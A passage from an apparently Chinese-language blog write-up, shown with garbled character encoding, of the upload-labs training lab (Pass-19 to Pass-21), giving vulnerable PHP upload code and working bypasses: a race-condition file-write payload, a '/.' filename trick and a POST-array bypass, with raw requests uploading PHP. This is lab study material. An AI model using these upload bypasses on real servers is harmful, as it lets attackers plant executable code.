<p>è¿™å…³ç½‘ä¸Šæ€è·¯æ˜¯æ¡ä»¶ç«äº‰ç„¶åæ–‡ä»¶åŒ…å«å›¾ç‰‡ã€‚ä¸ªäººè®¤ä¸ºï¼Œå¦‚æœèƒ½æ–‡ä»¶åŒ…å«ï¼Œå°±æ²¡å¿…è¦å»ç«äº‰äº†ï¼Œç›´æ¥å³é”®è®¿é—®å›¾ç‰‡ï¼ŒåŒ…å«è·¯å¾„å³å¯ã€‚æ‰€ä»¥æˆ‘è§‰å¾—ä½œè€…çš„æœ¬æ„æ˜¯ï¼Œä¸Šä¼ ä¹‹åï¼Œæ— æ³•çœ‹åˆ°å›¾ç‰‡ï¼Œå¾—ä¸åˆ°å›¾ç‰‡åã€‚å±•ç¤ºå‡è®¾çœ‹ä¸åˆ°å›¾ç‰‡åçš„æ–¹å¼ï¼ŒåªçŸ¥é“åœ¨uploadã€‚<br>çœ‹åç«¯ä»£ç ï¼Œå…ˆä¿å­˜ï¼Œåæ”¹åï¼Œæ‰€ä»¥æ¡ä»¶ç«äº‰ã€‚<br>å› ä¸ºåå°åªæ£€æŸ¥æ–‡ä»¶ååç¼€ï¼Œæ‰€ä»¥ç›´æ¥ä¿®å»ºæ–‡ä»¶åå³å¯ã€‚<br>å†™ä¸€ä¸ªgifå¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;in_file.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶ååŒPass-18ï¼Œintruderé‡æ”¾<br>ä½¿ç”¨pythonç›‘å¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.8.107/upload/upload-labs/include.php?file=upload/test.gif&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;123&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Sucess!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;testingâ€¦â€¦&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>å¾…æˆåŠŸï¼Œç„¶åè®¿é—®å¯¹åº”in_file.phpå³å¯<br><img src="/2022/02/28/upload-labs/2022-03-05-11-12-06.png"></p>
<h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p><strong>ä½¿ç”¨&#x2F;. ç»•è¿‡pathinfo($file_name,PATHINFO_EXTENSION);</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../common.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        $file_name = trim($_POST[&#x27;save_name&#x27;]);</span></span><br><span class="line"><span class="comment">        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line"><span class="comment">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span></span><br><span class="line"><span class="comment">        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line"><span class="comment">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line"><span class="comment">        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;file_name:&quot;</span>.<span class="variable">$file_name</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);<span class="comment">//é—®é¢˜ä¸»è¦å‡ºåœ¨è¿™</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;file_ext:&quot;</span>.<span class="variable">$file_ext</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; <span class="comment">//è¿˜æœ‰è¿™</span></span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>pathinfoåªä¼šæ£€æŸ¥æœ€åä¸€ä¸ªæœ€åä¸€ä¸ª <code>.</code> ä¹‹åçš„åå­—ï¼Œæ‰€ä»¥å¯ä»¥è½»æ¾ç»•è¿‡ï¼Œè€Œ<code>æ–‡ä»¶å/.</code> ä¼šè¢«move_uploaded_fileè®¤ä¸ºåªæœ‰ <code>æ–‡ä»¶å</code><br>æ‰€ä»¥å°±æ„é€ </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://<span class="number">192.168</span><span class="number">.8</span><span class="number">.107</span>/upload/upload-labs/Pass-<span class="number">20</span>/index.php</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">13977230631673</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;test.png&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">13977230631673</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;save_name&quot;</span></span><br><span class="line"></span><br><span class="line">upload-<span class="number">19.</span>php/.</span><br><span class="line">-----------------------------<span class="number">13977230631673</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">13977230631673</span>--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è®¿é—®å³å¯<br><img src="/2022/02/28/upload-labs/2022-03-05-11-49-17.png"></p>
<h2 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h2><p><strong>POSTæ•°ç»„ç»•è¿‡</strong><br>å®¡è®¡ä»£ç ï¼ŒåŸºæœ¬é€»è¾‘æ˜¯ï¼Œæ£€æŸ¥æ–‡ä»¶ç±»å‹å’Œåç¼€ï¼Œæ¼æ´åœ¨å°†æ–‡ä»¶åæ ¹æ® <code>.</code> åˆ†å‰²æˆæ•°ç»„ï¼Œæ²¡æœ‰è€ƒè™‘åˆ°å¯ä»¥POST æ•°ç»„é€ æˆæ¼æ´</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../common.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">            <span class="comment">//mime check</span></span><br><span class="line">            <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//check filename</span></span><br><span class="line">                <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));<span class="comment">//æ¼æ´ç‚¹</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">                <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">                    <span class="variable">$msg</span> = <span class="string">&quot;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!&quot;</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">                    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">                    <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                        <span class="variable">$msg</span> = <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;</span>;</span><br><span class="line">                        <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$msg</span> = <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å…ˆæµ‹è¯•æ­£å¸¸æƒ…å†µä¸‹ï¼š</p>
<p><img src="/2022/02/28/upload-labs/2022-03-05-20-22-27.png"></p>
<p>save_nameä¸ºæ•°ç»„çš„æƒ…å†µï¼š<br><img src="/2022/02/28/upload-labs/2022-03-05-20-40-03.png"><br>å¯ä»¥çœ‹åˆ°ï¼Œmimeæ£€æŸ¥ï¼Œå’Œæ–‡ä»¶åç¼€æ£€æŸ¥éƒ½è¢«ç»•è¿‡äº†ã€‚<br>è®¿é—®å³å¯<br><img src="/2022/02/28/upload-labs/2022-03-05-20-40-40.png"></p>
<p><strong>å‚è€ƒï¼š</strong></p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.pathinfo.php">pathinfo</a></p>

  </div>
</article>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">é¦–é¡µ</a></li>
         
          <li><a href="/about/">å…³äº</a></li>
         
          <li><a href="/archives/">å½’æ¡£</a></li>
         
          <li><a href="/search/">æœç´¢</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#upload-files-%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">upload files å­¦ä¹ </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-o1"><span class="toc-number">1.1.</span> <span class="toc-text">Pass-o1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-02"><span class="toc-number">1.2.</span> <span class="toc-text">Pass-02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-03"><span class="toc-number">1.3.</span> <span class="toc-text">Pass-03</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-04"><span class="toc-number">1.4.</span> <span class="toc-text">Pass-04</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-05"><span class="toc-number">1.5.</span> <span class="toc-text">Pass-05</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-06"><span class="toc-number">1.6.</span> <span class="toc-text">Pass-06</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-07"><span class="toc-number">1.7.</span> <span class="toc-text">Pass-07</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-08"><span class="toc-number">1.8.</span> <span class="toc-text">Pass-08</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-09"><span class="toc-number">1.9.</span> <span class="toc-text">Pass-09</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-10"><span class="toc-number">1.10.</span> <span class="toc-text">Pass-10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-11"><span class="toc-number">1.11.</span> <span class="toc-text">Pass-11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-12"><span class="toc-number">1.12.</span> <span class="toc-text">Pass-12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-13"><span class="toc-number">1.13.</span> <span class="toc-text">Pass-13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-14"><span class="toc-number">1.14.</span> <span class="toc-text">Pass-14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-15"><span class="toc-number">1.15.</span> <span class="toc-text">Pass-15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-16"><span class="toc-number">1.16.</span> <span class="toc-text">Pass-16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-17"><span class="toc-number">1.17.</span> <span class="toc-text">Pass-17</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-18"><span class="toc-number">1.18.</span> <span class="toc-text">Pass-18</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-19"><span class="toc-number">1.19.</span> <span class="toc-text">Pass-19</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-20"><span class="toc-number">1.20.</span> <span class="toc-text">Pass-20</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-21"><span class="toc-number">1.21.</span> <span class="toc-text">Pass-21</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/02/28/upload-labs/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/02/28/upload-labs/&text=upload-labs"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/02/28/upload-labs/&title=upload-labs"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/02/28/upload-labs/&is_video=false&description=upload-labs"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=upload-labs&body=Check out this article: http://example.com/2022/02/28/upload-labs/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/02/28/upload-labs/&title=upload-labs"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/02/28/upload-labs/&title=upload-labs"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/02/28/upload-labs/&title=upload-labs"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/02/28/upload-labs/&title=upload-labs"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/02/28/upload-labs/&name=upload-labs&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/02/28/upload-labs/&t=upload-labs"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> èœå•</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> ç›®å½•</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> åˆ†äº«</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> è¿”å›é¡¶éƒ¨</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021-2022
    Imp1ture
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">é¦–é¡µ</a></li><!--
     --><!--
       --><li><a href="/about/">å…³äº</a></li><!--
     --><!--
       --><li><a href="/archives/">å½’æ¡£</a></li><!--
     --><!--
       --><li><a href="/search/">æœç´¢</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"å¤åˆ¶åˆ°ç²˜è´´æ¿!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "å¤åˆ¶æˆåŠŸ!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
